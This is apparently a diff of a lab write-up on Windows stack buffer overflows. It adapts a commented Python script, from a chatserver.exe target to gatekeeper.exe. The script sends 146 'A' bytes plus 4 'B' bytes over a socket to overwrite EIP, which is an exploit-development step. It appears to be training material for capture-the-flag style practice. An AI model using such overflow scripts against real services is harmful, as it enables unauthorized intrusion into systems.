@@ -250,11 +250,11 @@ print "A" * 5000
     
     - **The `EIP` itself is `4 bytes` long** 
     
-- So, we going to overwrite this specific `4 bytes` just after we fill those `2012` bytes ;)  
+- So, we going to overwrite this specific `4 bytes` just after we fill those `146` bytes ;)  
 
     - **I will use the next python script for the whole Lab, so I will comment line by line _(Script without comment below)_**
     
-    - This will be saved as `1_fz3r0_brainstorm.py`  
+    - This will be saved as `1_fz3r0_gatekeeper.py`  
 
 ```python
     # We declare we are using python:
@@ -268,31 +268,25 @@ import socket
 
     # Sys Module allows operating on the interpreter as it provides access to the variables and functions that interact strongly with the interpreter.
     # For example: "print(sys.version)" will bring something like "id" linux bash command.
-    
+
 import sys
 
-    # 1 - The "chatserver.exe" prompt for a << name >> (no vulverable to buffer overflow)
-    #     variable ---> username
-    #     b        ---> "b" is used before the string to send the string as Bytes and no as String
+        # * - The "gatekeeper.exe" prompt for any string (vulverable to buffer overflow!!!)
+        #     variable |---> gate_string
     
-username = b"fz3r0"
-
-    # 2 - The "chatserver.exe" prompt for a << message >> (vulverable to buffer overflow!!!)
-    #     variable ---> message
+        # =-=-=-=-=-=-=-=-= The variable "gate_string" contains the next trick! =-=-=-=-=-=-=-=-=-=-=
     
-        # =-=-=-=-=-=-=-=-= The variable message contains the next trick! =-=-=-=-=-=-=-=-=-=-=
-    
-        # "A" * 2012    ---> I'll send 2012 bytes (A's) each time
-        #                    Remember, 2012 bytes is exactly the offset we use to make the system crash and point to the starting byte of EIP!!!
+        # "A" * 146    ---> I'll send 146 bytes (A's) each time
+        #                    Remember, 146 bytes is exactly the offset we use to make the system crash and point to the starting byte of EIP!!!
         
         # "B" * 4       ---> We are using "B" to identify the EIP, because "A" will reach to the "perfect world" buffer, then "B" will overwrite just the EIP spot! 
 
         # "b"           ---> "b" is used before the string to send the string as Bytes and no as String
         
-message = b"A" * 2012 + b"B" * 4
+gate_string = b"A" * 146 + b"B" * 4
 
-    # The script will start the loop with "try"
-    # "Try every time to insert 2012 bytes of A's, followed by 4 bytes of B's, until crash!" 
+    # The script will start with "try"
+    # "Try to insert 146 bytes of A's, followed by 4 bytes of B's" 
 
 try:
         
@@ -302,56 +296,35 @@ try:
         
             # I'll use the socket module to create the variable "s"
             # This is a very standard usage of the module socket to get IPv4:PORT = Socket
-            # We will define out RHOST & RPORT (Target/Windows 10 > chatserver.exe)
+            # We will define out RHOST & RPORT (Target/Windows 10 > gatekeeper.exe)
         
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.connect(('192.168.1.100',9999))
         
-            # Once it connects with the RHOST, the script will recieve "intro" Data back from it (The welcome message and that stuff...)
-            # It could work with one line, but for double checking I will try to recieve 2 packages just in case (maybe the "intro" of the program is divided in 2 load screen or something...)
+            # Once it connects with the RHOST, the script will only prompt for any string. (Not like other labs with more interactive actions recievend data, that's why I will comment the s.recv option) recieve "intro" Data back from it (The welcome message and that stuff...)
             
-        s.recv(1024)
-        s.recv(1024)
+        # s.recv(1024)
 
-            # Once it connects with the RHOST, and recieve the "intro" data, the program start to prompt for data.
-            # I will use the Socket Module and variable "s" to send data to the chatserver
-            
-                # 1. First, "chatserver.exe" prompt for a << name >> (no vulverable to buffer overflow)
+            # Once it connects with the RHOST, the program start to prompt for data.
+            # I will use the Socket Module and variable "s" to send data to the "gatekeeper.exe"
                 
-                    # send      = "send this"
-                    # username  = "fz3r0"
-                    # '\r\n\'   = \return \new line (like pressing "enter")
-                    # b         = "b" is used before the string to send the string as Bytes and no as String"
-
-        s.send(username + b'\r\n')
-
-            # Recieve data again (I'm sure is only 1 package this time, the prompt for the message)
-            # So, here I recieve the "message prompt" from the server:
-             
-        s.recv(1024)
-                
-                # 2 - Then, "chatserver.exe" prompt for a << message >> (vulverable to buffer overflow!!!)
+                # "gatekeeper.exe" prompt for a << gate_string >> (vulverable to buffer overflow!!!)
                     
                     # send      = "send this"
-                    # message   = "b"A" * 2012 + b"B" * 4" (++++ tricky payload ++++)
+                    # gate_string   = "b"A" * 146 + b"B" * 4" (++++ tricky payload ++++)
                     # '\r\n\'   = \return \new line (like pressing "enter")
                     # b         = "b" is used before the string to send the string as Bytes and no as String"
 
-        s.send(message + b'\r\n')
-       
-            # Recieve data again
-            
-        s.recv(1024)
-       
-            # Close connection with RHOST
-            # End of the loop
+        s.send(gate_string + b'\r\n')
+              
+            # Close connection with RHOST and end.
        
         s.close()
 
     # Exception script in case some error happen, return a message and exit. 
 
 except:
-        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Do'nt ask me, I'm just a script!!! >.<")
+        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Don't ask me, I'm just a script!!! >.<")
         sys.exit()
 ```
 
